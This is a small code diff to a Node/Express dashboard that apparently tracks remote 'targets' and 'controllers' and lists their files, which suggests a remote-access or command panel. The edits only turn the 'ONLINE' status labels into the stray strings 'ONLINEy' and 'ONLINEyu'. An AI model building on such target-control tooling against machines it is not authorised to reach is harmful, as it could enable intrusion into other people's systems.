@@ -10,7 +10,7 @@ let controllers = new Set();
 
 app.get('/', (req, res) => {
     const isOnline = targets.size > 0;
-    const statusText = isOnline ? '🟢 ONLINE (' + targets.size + ' target/s)' : '🔴 OFFLINE';
+    const statusText = isOnline ? '🟢 ONLINEy (' + targets.size + ' target/s)' : '🔴 OFFLINE';
     
     const html = `<!DOCTYPE html>
 <html>
@@ -70,7 +70,7 @@ app.get('/', (req, res) => {
             
             if (data.status === 'TARGET_STATUS') {
                 statusEl.className = data.online ? 'status online' : 'status offline';
-                statusEl.innerText = data.online ? '🟢 ONLINE' : '🔴 OFFLINE';
+                statusEl.innerText = data.online ? '🟢 ONLINEyu' : '🔴 OFFLINE';
             }
 
             if (data.action === 'FILE_LIST') {
